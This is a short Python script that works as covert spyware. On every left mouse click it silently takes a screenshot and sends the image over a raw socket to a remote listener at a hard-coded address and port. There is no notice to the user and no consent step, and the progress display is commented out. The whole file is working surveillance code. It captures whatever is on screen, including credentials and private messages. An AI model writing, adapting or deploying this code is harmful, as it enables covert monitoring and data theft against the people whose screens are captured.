import socket
import tqdm
import os
import win32api
import pyautogui


def click(key):
    state=win32api.GetKeyState(key)
    if (state!=0) and (state!=1):
        return True

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096

s = socket.socket()
host = "192.168.1.13"
port = 5001

s.connect((host, port))

while True:
    if click(0x01) ==True:
        pyautogui.screenshot("yeni.png")

        filename = "yeni.png"
        filesize = os.path.getsize(filename)
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())

        #progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                #progress.update(len(bytes_read))
s.close()